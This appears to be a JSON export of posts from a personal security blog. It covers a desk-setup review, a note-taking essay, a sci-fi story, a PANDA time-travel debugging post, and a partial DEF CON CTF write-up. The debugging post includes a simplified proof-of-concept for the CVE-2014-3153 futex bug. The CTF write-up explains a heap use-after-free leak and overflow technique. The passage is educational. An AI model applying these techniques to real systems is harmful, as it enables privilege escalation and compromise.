might want for maximum comfort during long hacking sessions. In this post, I’ll break down the process of constructing my battlestation by discussing each component and giving tips on how to find the right equipment for yourself. Breakdown Here’s a breakdown of my setup by section, product, and price.[1] Component Product Price Standing Desk VertDesk v3 30&quot; x 48&quot; $580 Standing Desk Mat Topo by Ergodriven $100 Chair Clatina Ergonomic Chair $200 Monitors (2) Acer K272HUL 27&quot; 2K IPS LCD $450 Vivo Dual Monitor Mount $30 Keyboard Ergodox-EZ $325 Mouse Evoluent VerticalMouse4 Wireless $110 Standing desk This is the pièce de résistance. An electronically adjustable sit-stand desk is a must-have, so you shouldn’t even consider settling for a converter or a hand-crank desk. After a lot of market research and poring over the (sadly quite inactive) r/StandingDesk, I concluded that the most important feature for me is stability at all heights. Being quite tall, I often max out the height of the desk, and I can’t condone any wobble in the forward-back or side-to-side directions. Another feature was longevity on the height adjustment components. I tend to switch between standing and sitting several times a day, so any motor should last at least 10,000 cycles. I looked at a few options, including the slightly cheaper but similarly well-rated Jarvis, but was convinced by YouTube reviews, marketing videos, and Reddit posts that touted the VertDesk as much more stable due to its crossbar between the legs. If you’re looking for a budget standing desk that will leave you with no regrets, I would only consider those two options. Constructing the desk was pretty laborious, but it really does feel solid as a rock, even at max height. The height adjustment is pretty smooth and level, and I’ve had no problems with the electronics so far. Standing desk mat This is something that you’ll never realize you’ve been missing from your standing desk setup until you try it out. By far the best option is the Topo mat by Ergodriven. The contours around the edges naturally invite you to shift your position, reducing strain from a single stance and distributing weight all around your foot for maximum comfort. The little mound in the middle is also insanely fun to step on and massage your soles. Chair This is a tough one. While many people online swear by the high-end $1000+ ergonomic chairs from brands like Herman Miller and Haworth, I went with a $200 chair off Amazon by an unknown brand that is often more comfortable than the Haworth Zody chair I use at work. A big deal for me is multi-axis adjustable armrests — not only the ability to go up and down, but also side-to-side, forward-back, and rotate. I like being able to rest my elbows in a variety of positions, though I’ve often found that it’s more comfortable to float your wrists and elbows while typing. My current chair has three axes — it’s missing front-back adjustment — but that’s still impressive for the price. I also like the back stability, ability to slide the seat forwards and backwards, and the cushion that is amenable to hours of sedentary hacking. Monitors I didn’t really have too many requirements for a monitor — I’m not a gamer, so refresh rate/response time isn’t important to me. But the resolution and the size have to be right — I wanted a 27&quot; and at least 2560x1440p (aka WQHD/QHD/2K). I made the mistake of buying a 27&quot; 1080p monitor early on and was disgusted by the blurriness of the icons and text on my Mac. I guess I’ve been spoiled by Retina displays. Acer is your best bet for cheap, large, high-res monitors. The model that I got, K272HUL, routinely goes on sale on Newegg for close to $200 — that’s essentially a steal, since monitors with the same specs can go for up to $500. Make sure that you’re getting the IPS version, which is more expensive than the TN version because of its better color reproduction and far better viewing from all angles. Gamers will have a different set of requirements, such as higher refresh rates on TN monitors and lower res for higher FPS, so keep that in mind. Keyboard I’ve really lost track of how many keyboards and mice I’ve tried over the years, this being the main source of RSI in my wrist and fingers. My old post is laughably outdated now — I’ve since outgrown the cheap ergonomic stuff I used to use, and for good reason. My mainstay used to be the Microsoft Natural ergonomic keyboard, as it’s one of the most comfortable options for its dirt-cheap price — $50 or less on Amazon. It’s definitely a decent gateway drug to the world of ergonomic keyboards. However, it will soon become woefully inadequate for power users, mainly due to its unwieldy size and lack of quality keycaps. After a while, I began to experience pain in my fingers as well due to constantly having to stretch for keys with my pinky finger. After that, your best bet is to go for the top-of-the-line models — the Kinesis keyboards and the Ergodox-EZ. I’ve tried the two most popular Kinesis keyboards, the split Freestyle2 and the legendary Advantage2, as well as the Ergodox, and had varying success. Firstly, I found the Advantage2 to be incredibly disappointing. It was incredibly difficult to learn how to use — even after a day of struggling, I could only type at a third my normal speed. This is partly due to its awful customization abilities — the only way you can remap keys is by manually swapping two keys at a time using a special key sequence. I also found its “finger well” to be overrated for ergonomics — curving my fingers caused more strain than normal usage, particularly in my ring and index fingers. The Freestyle2 fared much better, by comparison. Its familiar layout meant that I could type at my maximum of 100+ words per minute in no time, and being able to incline the two halves of the keyboard up to 15 degrees did wonders for my comfort. I did notice several downsides: you still need to stretch with your pinkies to reach a lot of the modifier keys on both the left and right side, and the dome keycaps were not very comfortable compared to the Cherry Brown mechanical switches on the Advantage2. Finally, that leads us to the latest and greatest in customizable ergonomic keyboards — the Ergodox-EZ. The best thing is the online graphical configurator for the keys. I was able to remap many pinky keys (ex. Enter, Backspace, Space, Arrows) to easily accessible thumb positions, while I restored other keys to familiar locations so that the learning curve was very fast. I’ve been using it for several months now with absolutely no pain, and I was typing at 90% of my maximum speed within two weeks. As of the time of this post, I actually ordered another Ergodox for work because I love it so much. My Kinesis keyboards will be relegated to the junk heap for the foreseaable future. Mouse I’ve also tried many sub-$25 ergonomic mice, before being given the opportunity to try the Evoluent VerticalMouse. It’s the most comfortable mouse I’ve tried, largely due to its ample size and five programmable buttons that I’ve aliased to common tasks, such as page up/down, which would otherwise cause a lot of middle finger strain via the scroll wheel. However, it has a ways to improve: the bluetooth model is notoriously glitchy, with my pointer occasionally jumping across the screen for no reason, and it could use more palm support in the form of a wider base rest. That being said, it’s the best (and priciest) option in a field of mediocre ergo mice. Accessories You might appreciate some of these accessories to round out your workstation: 17&quot; x 5&quot; Wire Cable Tray — wide enough for a thick 12-outlet power strip and installable on both sides of the desk. Adjustable Clamp Lamp — clamped to the back, this light can swing across your entire desk, adjusts in 4D, and doesn’t take up any valuable desk space or obstruct your view of your monitors. Under-monitor light bar — I’ve often been complimented on these little guys, which can stick under the monitor and add a bit of extra light, as well as an aesthetic touch. Dual-monitor mount — I don’t ask too much of my monitor mounts - they just need to be sturdy, since I rarely want to adjust them. You could splurge on two hydraulic arms instead of this fixed mount, which would give you maximum maneuverability. Hopefully, this guide has helped your own quest for ergonomic excellence. If I’m missing anything or you would like more recommendations, please get in touch. var options = { rowHeight: 140, margins: 4, lastRow: 'justify' }; $('.justified-gallery').justifiedGallery(options); 1.I'm not a gamer, so there's no PC included in this setup — but I do plan to build a high-end server tower for my CTF team, so expect a post on that in the future. ↩","categories":[{"name":"Meta","slug":"Meta","permalink":"http://raywang.tech/categories/Meta/"}],"tags":[{"name":"Ergonomics","slug":"Ergonomics","permalink":"http://raywang.tech/tags/Ergonomics/"}]},{"title":"Investing in a Good Note-Taking Application","slug":"Investing-in-a-good-note-taking-application","date":"2019-02-11T08:00:00.000Z","updated":"2024-08-29T06:03:14.439Z","comments":true,"path":"2019/02/11/Investing-in-a-good-note-taking-application/","permalink":"http://raywang.tech/2019/02/11/Investing-in-a-good-note-taking-application/","excerpt":"Perhaps the best investment that you could make in your own learning, knowledge retention, and organization is a good note-taking application. Over the years, I’ve dumped all of my accumulated knowledge about computer science, security, and technology into various note-taking apps, ensuring that I can easily recall information from the thousands of different sources that I’ve found useful. This post will be a general braindump of the factors behind choosing a note-taking app, a shameless plug for my favorite one, Quiver, and an explanation of how I use a note-taking app effectively.","text":"Perhaps the best investment that you could make in your own learning, knowledge retention, and organization is a good note-taking application. Over the years, I’ve dumped all of my accumulated knowledge about computer science, security, and technology into various note-taking apps, ensuring that I can easily recall information from the thousands of different sources that I’ve found useful. This post will be a general braindump of the factors behind choosing a note-taking app, a shameless plug for my favorite one, Quiver, and an explanation of how I use a note-taking app effectively. Over the years I’ve used many different note-taking and productivity apps, ranging from Wunderlist and Things to Evernote. As my needs have matured and my knowledge has grown, I’ve spent a lot of time thinking about this problem. A note-taking app is essentially an an extension of your brain’s storage and cataloguing capabilities, much like your phone or computer itself. Thus, it is a serious investment that merits a lot of consideration. I’ve tried many over the years, and finally settled on one — Quiver. Here are some of the considerations that were most important to me: Formatting/Organization I used Evernote for quite a while, before finally being forced to leave it. It’s by far the most well-known and popular option, but it lacks a lot of features that I found necessary. Most importantly, it doesn’t have support for Markdown, code, or LaTeX, which is essential for a CS person. Quiver has a mode that allows you to write Markdown and render a live side-by-side preview. I use Quiver exclusively in Markdown mode, although there is a rich-text mode. The Markdown mode even supports inline LaTeX within $s! Being able to quickly intersperse code, math, and text using well-known key sequences is invaluable for me. To give you an idea of my needs, some of the types of things I record in Quiver are: shortcuts for the many tools and applications I use, live lecture notes, notes and links to resources when learning a new topic, research logs, scratchwork for coding projects and CTFs, to-dos, personal journal entries, etc. Shortcuts Whatever note-taking app you choose, you need quick shortcuts to create, search, and categorize notes seamlessly, while doing any task like browsing the web or coding. Evernote and Quiver both provide this as customizable global hotkeys. Whenever I gather a new bit of information or see a link to some resources I want to save, I will quickly pop open an existing or new note from wherever I am and record it. I’ll also assign it to the relevant category and add some tags to be able to search for it more easily. Cross-platform and cross-device support Unfortunately, Quiver only works on MacOS, which isn’t much of a limitation for me, but may be for others. There’s a read-only iOS app, but I rarely use it. There’s an open-source alternative, Boostnote, that is marketed as available across all platforms, including iOS. When I was switching away from Evernote, I also tried Boostnote, but it was not very full-featured at the time, so I decided against it. Perhaps it’s matured a lot more since then, so it might be worth a shot now. However, I do use multiple laptops, so syncing is a big deal for me. Quiver stores all its notes in a local folder, which you can just add to a Google Drive or Dropbox folder to sync across devices. I actually prefer this to Evernote’s own cloud-sync service that you need to pay a subscription fee for. Investing in the future However, what does give me pause about Quiver is that there is only one maintainer, who doesn’t seem to be very active with addressing issues and developing new features. As I’ve said before, note-taking is an investment — you are investing in the application and its maintainer for potentially decades. There’s always a risk of your app no longer being supported, which may hurt you down the line. The pros of Quiver outweighed the very real fear that I have of the developer abandoning the project, but it may be too big a risk for some of you. Another thing to consider is vendor lock-in. How easily can you get your notes out, if you have to abandon ship? Quiver stores its notes in a JSON format that is easily converted or exported. And, I was able to import from Evernote’s proprietary notebook format, which reduced the inertia to switch. Regardless of what you decide upon, take into account the above few factors and make a calculated choice.","categories":[{"name":"Meta","slug":"Meta","permalink":"http://raywang.tech/categories/Meta/"}],"tags":[]},{"title":"Time-Travel Debugging in PANDA","slug":"Time-Travel-Debugging-in-PANDA","date":"2018-11-14T08:00:00.000Z","updated":"2024-08-29T06:03:14.440Z","comments":true,"path":"2018/11/14/Time-Travel-Debugging-in-PANDA/","permalink":"http://raywang.tech/2018/11/14/Time-Travel-Debugging-in-PANDA/","excerpt":"During a weekend hackathon with some of the Lincoln Lab maintainers of PANDA, I implemented a really useful feature — time-travel debugging! As has been discussed in Ret2Systems’ great blog post, time-travel debugging is an invaluable tool in the reverse engineer’s arsenal. While Mozilla’s brilliant rr is the dominant choice for Linux user binaries and WinDBG Preview works on Windows binaries, PANDA can debug user and kernel space on both systems. In this blog post, I’ll talk about the simple design behind reverse-execution and demonstrate its utility in root-causing a Linux kernel n-day.","text":"During a weekend hackathon with some of the Lincoln Lab maintainers of PANDA, I implemented a really useful feature — time-travel debugging! As has been discussed in Ret2Systems’ great blog post, time-travel debugging is an invaluable tool in the reverse engineer’s arsenal. While Mozilla’s brilliant rr is the dominant choice for Linux user binaries and WinDBG Preview works on Windows binaries, PANDA can debug user and kernel space on both systems. In this blog post, I’ll talk about the simple design behind reverse-execution and demonstrate its utility in root-causing a Linux kernel n-day. Design PANDA, which is built on the QEMU emulator, has the ability to record-replay a full system running a variety of architectures. Non-deterministic events such as hardware interrupts, timestamp reads, etc. are recorded in a logfile and read back during replay, synchronized by the guest instruction index. This allows you to capture and analyze a recording of a whole system, but until now, only in the forward direction. QEMU also contains a GDB stub that can talk to a remote GDB client. We extended this debug mechanism to enable reverse execution, as well as other useful debugging commands inspired by Mozilla rr. Reverse execution We implemented the two commands reverse-step and reverse-continue in the simplest possible way given existing mechanisms. To be able to time-travel, we wrote a checkpointing API built on QEMU’s savevm. Checkpoints are just snapshots of all guest state. When checkpointing is enabled, checkpoints are periodically taken, depending on how much space you make available on RAM or disk to store them. When reverse-step is invoked, PANDA sets a breakpoint on the previous guest instruction count, restores to the latest checkpoint and runs forward until that breakpoint is hit. reverse-continue is a little more complex. It requires at least two restores to reach the next breakpoint — on the first run forward, PANDA doesn’t break on any breakpoints, but records the last breakpoint encountered. Then, it restores to that checkpoint again and runs until that last breakpoint. Here’s this case, represented pictorially: However, if no breakpoints were encountered, PANDA will restore to the previous checkpoint and do the same procedure, until it either finds a breakpoint to halt on, or reaches the beginning of the replay. This means that you can use watchpoints and breakpoints just like normal under reverse! We also added several GDB utility commands, including when to get the current guest instruction count and rrbreakpoint to set a breakpoint on a guest instruction count. You can peruse the full list here. Using time-travel to root cause a Linux kernel n-day To demonstrate an exciting use of PANDA time-travel, I figured it would be hip and cool to show off this capability with a Linux kernel root-cause-analysis. CVE-2014-3153 CVE-2014-3153 was famously used in geohot’s towelroot exploit to jailbreak the Samsung Galaxy S5. Broadly, it involves a bug in Linux’s fast userspace mutexes, or futexes — a certain sequence of a few interleaved futex syscalls will cause memory corruption. futexes are basically locks which can have a list of waiters with different priority levels. Each futex is associated with a userspace int uaddr, which stores the thread id of the thread, if any, that holds the lock. See references for more background info, but it’s not necessary for this post. Using a PoC borrowed from this fantastic writeup, I’ll show how to record it under PANDA and use reverse-debugging to identify the vulnerability. Here’s the simplified PoC, with operations ordered by number (you’d have to enforce the order using thread locks). 123456789101112131415161718192021int uaddrA = 0, uaddrB = 0; void* requeue_thread(void* arg)&#123; int ret = futex_wait_requeue_pi(&amp;uaddrA, &amp;uaddrB); // 2. waits until uaddrB is freed return NULL; // 6. &#125; int main()&#123; int ret = futex_lock_pi(&amp;uaddrB); // 1. Associates uaddrB with a futex and locks it pthread_t t; pthread_create(&amp;t, NULL, requeue_thread, NULL); futex_requeue_pi(&amp;uaddrA, &amp;uaddrB, uaddrA); // 3. Adds thread 2 to list of waiters on uaddrB uaddrB = 0; // 4. ?? futex_requeue_pi(&amp;uaddrB, &amp;uaddrB, uaddrB); // 5. ?? return 0; // 7. // 8. eventually crash?! &#125; The futex_wait_requeue_pi man page basically says that the caller will acquire uaddrA and wait for uaddrB to be released. futex_requeue will take care of either adding the waiting thread to uaddrB's wait list or waking it up. Making a recording First, let’s make a PANDA recording of the PoC and the resulting crash. I’m using an x86 qcow which has the Linux kernel 3.2.51. As you can see, we got an invalid opcode kernel panic in rt_mutex_top_waiter, which grabs the waiter at the head of a futex’s wait list. rt_mutexes are just another type of lock that’s used to help implement futexes. We can use time-travel on the replay to work out how this happened. Loading kernel symbols and isolating the panic To start the replay and wait for a GDB attach, we just need to do &#123;path_to_qemu&#125;/qemu-system-i386 &#123;path_to_qcow&#125;/wheezy_panda2.qcow2 -replay towelroot_poc -S -s -panda checkpoint Next, connect GDB with gdb -x ~/panda/panda/scripts/gdbinit -ex 'target remote localhost:1234'. To get kernel source and debug symbols, you can download from this mirror and this link, then run these commands: 123dir /home/raywang/linux-3.2.51 set substitute-path /build/linux-n2St39/ /home/raywang/ symbol-file /home/raywang/vmlinux-3.2.0-4-686-pae If you have symbols for a user binary, you can add more symbol files if you specify the load address, like add-symbol-file towelroot_poc 0x080486c0. Let’s begin by setting a breakpoint on rt_mutex_top_waiter(). We can see exactly where the illegal ud2 op is generated, resulting in the panic we saw above. So, the offending line is 1234=&gt; rtmutex_common.h:72 w = plist_first_entry(&amp;lock-&gt;wait_list, struct rt_mutex_waiter, list_entry); // grabs first waiter on lock&#x27;s wait_list BUG_ON(w-&gt;lock != lock); // sanity check So why does the sanity check w-&gt;lock != lock fail? If we print the rt_mutex_waiter object w, we can clearly see that it’s corrupted. 123456789101174 BUG_ON(w-&gt;lock != lock); =&gt; 0xc105cd06 &lt;rt_mutex_top_waiter+3&gt;: cmp DWORD PTR [edx+0x20],eax 0xc105cd09 &lt;rt_mutex_top_waiter+6&gt;: je 0xc105cd0d &lt;rt_mutex_top_waiter+10&gt; 0xc105cd0b &lt;rt_mutex_top_waiter+8&gt;: ud2 (gdb) p/x $eax $4 = 0xc75e9da8 (gdb) p/x *w $6 = &#123;list_entry = &#123;prio = 0xc5230000, prio_list = &#123;next = 0xc7550ae0, prev = 0xc5d0a1c0&#125;, node_list = &#123;next = 0x0, prev = 0xc5230000&#125;&#125;, pi_list_entry = &#123;prio = 0xc103b7fc, prio_list = &#123;next = 0x8, prev = 0xc5231ef4&#125;, node_list = &#123; next = 0xc5d0a1c0, prev = 0xc5230000&#125;&#125;, task = 0xc104565c, lock = 0xc5391580&#125; Notice the nonsensical priority list fields, such as the int priority prio = 0xc5230000 and list pointer next = 0x8, as well as the incorrect lock value. Let’s set a watchpoint on this rt_waiter to see where it came from and how it’s modified. We also set breakpoints on the futex syscalls, futex_requeue() and futex_wait_requeue_pi(). Returning to source Going back, we can see that several unrelated kernel functions, like apic_timer_interrupt, __do_fault, etc. are overwriting the rt_waiter, which seems like a dangling object. But if we rc a few more times, we can return to the first call to futex_requeue, which actually iterates over all queued waiters and adds them to uaddrB's wait_list, via rt_mutex_start_proxy_lock and task_blocks_on_mutex. But where is waiter initialized? We can rewind even further, using a watchpoint on the entire waiter object, to see where it is declared. Aha! We’ve found the origin of the waiter! It’s allocated on the stack of futex_wait_requeue_pi, which makes sense, because futex_wait_requeue_pi’s thread will be the waiter for the uaddrB futex. So this stack object must be dangling after futex_wait_requeue_pi returns. Pinning down the bug So, we now need to figure out what caused futex_wait_requeue_pi to return while the waiter it created is still in use. To do that, let’s set a breakpoint at the end of futex_wait_requeue_pi and step backwards. As you can see, after this thread is awakened from futex_wait_queue_me, its q.rt_waiter is NULL, but before it went to sleep, it was defined as q.rt_waiter = &amp;rt_waiter. This is, in fact, very bad — because q.rt_waiter is now NULL, futex_wait_requeue_pi thinks that its waiter has been already been cleaned up, so doesn’t bother to try itself and leaves the dangling rt_waiter in the wait_list. 123456789/* Here q-&gt;rt_waiter is NULL, so this branch is taken */ if (!q.rt_waiter) &#123; // line 2353 ... &#125; else &#123; // line 2363 ... /* Skips this branch, which would have removed rt_waiter from the wait list */ ret = rt_mutex_finish_proxy_lock(pi_mutex, to, &amp;rt_waiter, 1); ... &#125; Finally, let’s figure out who set q.rt_waiter to NULL. It’s the call to requeue_pi_wake_futex, which is called when the main thread’s second futex_requeue attempts to wake thread 2. Reverse-stepping into the previous function, we can determine exactly why futex_requeue decides to wake thread 2. futex_lock_pi_atomic checks if the uaddrB futex is free with an atomic cmpxchg. If uaddrB is 0, then the cmpxchg succeeds and futex_lock_pi_atomic thinks it’s acquired the futex, so the main thread thinks it is time to wake up thread 2. And of course, our PoC did exactly that — set uaddrB to 0 right before re-calling futex_requeue in step 4, hijacking the control flow of futex management. Summary To summarize, we used time-travel debugging under PANDA to record a kernel bug and explore it deterministically. We found that that mysterious uaddrB = 0 line caused all this trouble. By making futex_requeue think that uaddrB was free and had no more waiters, that line caused thread 2 to wake up in an inconsistent state. This led to a dangling rt_waiter on uaddrB's waitlist that eventually got corrupted, triggering a kernel panic. You can take a look at the patch for this bug, which simply checks for a dangling waiter instead of blindly trusting the userspace uaddr value. Future improvements The above example demonstrated a powerful application of time-travel debugging, and more features should make it even more valuable. Support for ARM and PowerPC is on the horizon, and I’d like to reach command parity with Mozilla rr. Performance The most expensive part of time-travel in terms of space is checkpointing, aka making snapshots. Every checkpoint takes up as much memory as the guest VM has access to. It would be nice to add a delta-checkpoint mechanism to QEMU to apply smaller diffs between checkpoints, which could greatly reduce the space requirements. The slowest part is the forward pass through every checkpoint, which could take a while depending on how widely spaced your checkpoints are. Also, if you give rsi a repeat count like rsi 20, GDB will naïvely run the rsi command 20 times, which involves 20 checkpoint restores. These perf issues should be addressed in future iterations. While it’s still a work in progress and does have some instability, I invite you to try it out on your next full-system debugging task. Happy reversing! References https://appdome.github.io/2017/11/23/towelroot.html https://github.com/SecWiki/linux-kernel-exploits/tree/master/2014/CVE-2014-3153","categories":[{"name":"Tooling","slug":"Tooling","permalink":"http://raywang.tech/categories/Tooling/"}],"tags":[{"name":"Panda","slug":"Panda","permalink":"http://raywang.tech/tags/Panda/"}]},{"title":"Sunset of Eden: Sci-Fi Short Story Based on the Three-Body Problem","slug":"Sunset-of-Eden-Sci-Fi-Short-Story-based-on-The-Three-Body-Problem","date":"2018-05-27T07:00:00.000Z","updated":"2024-08-29T06:03:14.440Z","comments":true,"path":"2018/05/27/Sunset-of-Eden-Sci-Fi-Short-Story-based-on-The-Three-Body-Problem/","permalink":"http://raywang.tech/2018/05/27/Sunset-of-Eden-Sci-Fi-Short-Story-based-on-The-Three-Body-Problem/","excerpt":"The Three-Body Problem trilogy, by brilliant Chinese author Cixin Liu, is a triumph of human creativity that I’ve previously extolled as one of the greatest sci-fi epics of all time. This short story was written in 2016, and is based off of events in the spectacular final book, Death’s End.","text":"The Three-Body Problem trilogy, by brilliant Chinese author Cixin Liu, is a triumph of human creativity that I’ve previously extolled as one of the greatest sci-fi epics of all time. This short story was written in 2016, and is based off of events in the spectacular final book, Death’s End. In the beginning, there was Eden. Then, there was Singer. Today, Singer felt lucky. Like the universe, he was full of youth, blessed to be alive in such a day and age. For, while the sea of high-entropy grew all around him, unstoppable since the universe’s recent creation, Singer and his kind were islands of low-entropy. Like their grand home world, Singer thought, they were flickers of order in the primordial chaos. And, in his joy, he sang, In the beginning, there was Eden, Lovely Eden and Singer’s songs, Time passes for none but us, The universe sings our melody, Like friends on the edge of the sea. Singer paused, his thoughts drifting away. Here, in his seed, Singer could peer out into the vast beauty of space, knowing he would be the first low-entropy entity to witness whatever he put his eye to. The universe was indeed exquisite. Each of the ten dimensions of the universe was intricately constructed and compounded the splendor of the others. Any alteration, and there would be diminishment. A civilization such as Singer’s, with access to seemingly unlimited resources in this Edenic bounty of the cosmos, had reached, he thought, the pinnacle of technology. His glorious Elders had already solved most of the mysteries the universe had to offer. Like a child in its naïvete, the cosmos had hidden its secrets feebly, and Singer’s kind, in their infinite wisdom, had already coaxed out each one from its hiding place. And in its puerile petulance, the universe had laid down “unbreakable” laws — rules that, far from being rigid, were being molded as the Elders molded the rest of the cosmos. His job was one of high prestige — a noble sentry, stationed a hundred thousand structures from his home world, searching for friends among the cosmos. Singer often wondered what it would be like to meet a low-entropy entity not like himself. But in the many time grains that Singer had been on this seed, he had never once detected signs of friends in the universe. It would only take a fraction of a time grain to confirm that another low-entropy entity had presented itself to the cosmos, a declaration that would be immediately hailed with equal hope and joy. For, even Singer understood the basic principle of this universe, that one could perceive every corner of it near instantly. That was another beautiful thing about his Eden. So, by this point, he had accepted one thing: we are well and truly alone in this universe. But who knew? Perhaps, countless time grains from now, another low-entropy entity would arise and begin the journey along the garden path. Then, Singer imagined, our kind would be to them as Elders to me — a wise force, a guiding force. But there was no need to contemplate such impossible things. Singer mindlessly reached for a flower, humming a new song. It was a mere decoration, a plaything with such simple, dull features that Singer felt silly being absorbed with it. He was sometimes ridiculed by others on the seed for his habit of keeping a flower with him at all times, like a child inseparable from a trinket. Yet, Singer couldn’t help but admire its tender qualities. It was an early achievement of Singer’s civilization. In its crystal-clear package, it looked entirely harmless — fragile, weak, totally incapable of even contacting the universe it was created in. Singer’s Elders thought it useless. What purpose, they said, could one have for a nine-dimensional object? Singer had no reason to disagree. Just then, Singer stopped his distracted humming. He noticed rustles of movement from the seed’s feelers. Like an antenna of a sea-insect, the feeler took on a life of its own, flexing and responding to a force invisible in all ten dimensions. Singer’s multitude of senses became alert. He had never seen this behavior from the feelers before. It was a communication from another low-entropy entity! The messages came flooding in, unintelligible, but following some pattern, as if being repeated in many different forms. Singer shivered in delight. The message was not masked in any way. It was clearly meant to reveal the sender’s location. He moved to trace the message and find the sender through the Big Eye, then hesitated. The presence of the unknown gave him pause, and for the first time, he felt unease. There was something about this message… The core finished its analysis. It stated, matter-of-factly, that the message had been broadcast through short membrane, not the primitive or long membrane Singer was expecting. Paralyzed in shock, Singer struggled to remember what his Elders had discovered about short membrane. It was a fundamental concept in the cosmology of the Elders, but its origins and significance were poorly understood. All that was known was that it predated Eden, and could only be utilized with a great expenditure of energy — more energy than was known to exist in this universe. An unfathomable power akin to gods, unparalleled. An entity to whom this universe and its contents were like a newly formed puddle to an ocean. Sensations rippled through Singer that he had never felt before. And as they did, billions upon billions of souls on the home world felt these sensations with him, as they had never felt before. A feeling of being absolutely diminutive. A feeling of sheer terror. The universe is not empty, the multitude of minds clamored. The universe is fear. The universe is danger. An instinct welled up inside Singer. It was an instinct, not selected by evolution over many generations, but latent in the very first of Singer’s kind. Not a single entity on the seed, nor even Singer himself, had been aware of this instinct or knew what it meant, except that it was now necessary for survival. “In the cosmos, no matter how fast you are, someone will be faster.” In his terror, Singer found another song come to him. My flower sings to me as I sing to it My only friend In its loving caress, all the universe appears as dust And Singer instinctively flicked his flower in the direction of the broadcast. The flower flitted across 10-D space, reaching its destination almost instantaneously. Then, like a rose blooming in reverse time lapse, as its delicate petals fold inwards, encasing themselves again, the flower began to furl. But it was not only the flower’s petals that folded in. Space itself seemed to wither and collapse around the trinket, layering itself endlessly upon the precipitant. Like water over a cliff, one dimension — one of ten — cascaded into an ever-expanding bud. Another instant later, the universe of Eden was unrecognizable and again lifeless. One dimension, lost forever. The dark forest, uncovered. All credits to wallpaperswide.com and Ian Portnoy for the cover photo If you're looking for more Cixin Liu works, I recommend his collection The Wandering Earth","categories":[{"name":"Writing","slug":"Writing","permalink":"http://raywang.tech/categories/Writing/"}],"tags":[{"name":"SF/Fantasy","slug":"SF-Fantasy","permalink":"http://raywang.tech/tags/SF-Fantasy/"}]},{"title":"DEF CON Quals 2018: It's a Me","slug":"DEF-CON-Quals-2018-It-s-a-Me","date":"2018-05-15T02:39:05.000Z","updated":"2024-08-29T06:03:14.438Z","comments":true,"path":"2018/05/14/DEF-CON-Quals-2018-It-s-a-Me/","permalink":"http://raywang.tech/2018/05/14/DEF-CON-Quals-2018-It-s-a-Me/","excerpt":"Category: pwnable | Points: 124 | Solves: 49 | Challenge files 1234567&gt; checksec mario[*] &#x27;/home/raywang/ctf/DEFCONQ2018/mario&#x27; Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled Summary This is a classic C++ menu challenge that features a UAF and heap overflow with a vtable pointer overwrite. The main heap techniques involve using a free unsorted bin chunk to leak a libc and heap address, as well as some feng shui to place an object in an overflow-able region on the heap. fortenforge, qzqxq, and I combined to reverse the binary and discover the 3 separate vulnerabilities.","text":"Category: pwnable | Points: 124 | Solves: 49 | Challenge files 1234567&gt; checksec mario[*] &#x27;/home/raywang/ctf/DEFCONQ2018/mario&#x27; Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled Summary This is a classic C++ menu challenge that features a UAF and heap overflow with a vtable pointer overwrite. The main heap techniques involve using a free unsorted bin chunk to leak a libc and heap address, as well as some feng shui to place an object in an overflow-able region on the heap. fortenforge, qzqxq, and I combined to reverse the binary and discover the 3 separate vulnerabilities. Reversing When you first create a new Customer or login to this pizza kitchen, you have the option to order, cook, or admire Pizzas. When you order, you can specify Unicode emoji ingredients like 🍍 and 🍅. If you try to order a pizza with 🍍, you are kicked out and banned from ever logging in again. 123456Wellcom my friende!! It&#x27;s-a me, Mario! Ready for pizza italiana vera?------------------- MAIN MENU -------------------(N)ew customer(L)ogin as customer(E)xitChoice: N 1234567&gt;&gt; Welcome ghostly------------------- USER MENU -------------------(O)rder more pizzas(C)ook all pizzas(A)dmire cooked pizzas(L)eaveChoice: When you ask to have your pizzas cooked, the ingredients are strcated together and checked with strstr — if a pizza contains only 🍅, it’s “good”, if it has 🍍, it’s “criminal” — then, a new Pizza object of the correct type is created. You can also provide an explanation string, which is malloced onto the heap and stored in the Customer. This explanation is then freed at the end of cook, if the number of good pizzas == total number of pizzas. In pseudo-code, the Customer struct looks like 1234567Customer &#123; +0 name ptr +8 vector of ordered pizzas +32 explanation ptr +40 vector of cooked pizzas +65 isBanned&#125; Stage 1: Leak You want to trick Mario into cooking a pineapple pizza first. We make a pizza with two ingredients, one ending in \\xf0\\x9f and another starting with \\x8d\\x8d that, when strcated together, give a Unicode pineapple (\\xf0\\x9f\\x8d\\x8d). Now you’ve made Mario upset! Your customer is then stored as a global variable upset_user. You also unlock a menu option to print the explanation field, which would be a UAF if the explanation were freed in cook. We can ensure that the explanation is freed by overflowing the 1-byte counter of total number of pizzas, with (16 bad + 1 good pizza) = 17 total pizzas % 16 = 1 total pizza. 1234567891011int angry_leak()&#123; printf( &quot;your friend %s ordered a pizza with %s and I should stay calm?\\n&quot;, *(_QWORD *)&amp;upset_user-&gt;nameptr, &amp;pineapple); printf( &quot;&#x27;That must be a mistake&#x27;, you may say. But I asked, and this is what he had to say: %s\\n&quot;, *(_QWORD *)&amp;upset_user-&gt;explanation); return puts(&quot;niente scuse&quot;);&#125; What are the contents of a freed chunk that we can leak? If the chunk is &gt;fastbin size (&gt;0x80), when it is freed, it will be inserted into the unsorted bin, which is a doubly-linked list of recently freed chunks. The fd and bk pointers will thus be populated with the address of the unsorted bin, which is in the main_arena struct in libc. This gives us our libc leak. 123450x555555773120: 0000000000000000 0000000000000111 | &lt;-- explanation chunk. size of explanation chunk=0x1110x555555773130: 00007FFFF7839C78 00007FFFF7839C78 | &lt;--- fd and bk pointers, both &amp;unsorted bin0x555555773140: 5151515151515151 5151515151515151 | QQQQQQQQQ&gt; &lt;---- explanation data0x555555773150: 5151515151515151 5151515151515151 | QQQQQQQQQ&gt;... We can also get a heap leak if the unsorted bin has another chunk when we free our explanation. In that case, when the explanation chunk is inserted, the fd pointer will be set to the other free chunk. The free explanation chunk then looks as follows: 123450x555555773120: 0000000000000000 0000000000000111 | &lt;-- explanation chunk0x555555773130: 00005555557740C0 00007FFFF7839B78 | &lt;--- fd ptr to next chunk, bk ptr to &amp;unsorted bin0x555555773140: 5151515151515151 5151515151515151 | QQQQQQQQQ&gt;0x555555773150: 5151515151515151 5151515151515151 | QQQQQQQQQ&gt;... This image from sploitfun is great for understanding the linked list structure of heap bins. Stage 2: Overflow If we successfully cook a pineapple pizza, we are also given a new menu option to “explain ourselves” by overwriting our explanation. It reads 300 bytes into the explanation on the heap, even though our explanation was previously malloced with a smaller length (the length of our original explanation). IDA can’t 